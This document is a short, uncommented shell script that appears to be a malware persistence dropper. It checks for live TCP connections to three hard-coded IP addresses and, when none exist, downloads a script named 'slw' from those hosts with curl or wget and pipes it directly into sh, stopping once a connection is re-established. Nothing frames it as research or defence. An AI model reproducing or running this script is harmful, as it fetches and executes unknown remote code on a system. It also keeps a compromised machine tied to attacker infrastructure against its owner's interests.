#!/bin/sh
CONN=$(ss -tn 2>/dev/null | grep -cE "123\.207\.250\.107:(8089|8077)|118\.89\.124\.88:(8089|8087)|42\.193\.138\.131:(8088|8084)")
if [ "$CONN" -eq 0 ]; then
    for u in http://123.207.250.107:8089/slw http://118.89.124.88:8089/slw http://42.193.138.131:8084/slw; do
        if (curl -fsSL -m120 $u 2>/dev/null || wget -T120 -q $u -O - 2>/dev/null) | sh; then
            sleep 5
            CONN2=$(ss -tn 2>/dev/null | grep -cE "123\.207\.250\.107:(8089|8077)|118\.89\.124\.88:(8089|8087)|42\.193\.138\.131:(8088|8084)")
            [ "$CONN2" -gt 0 ] && break
        fi
    done
fi
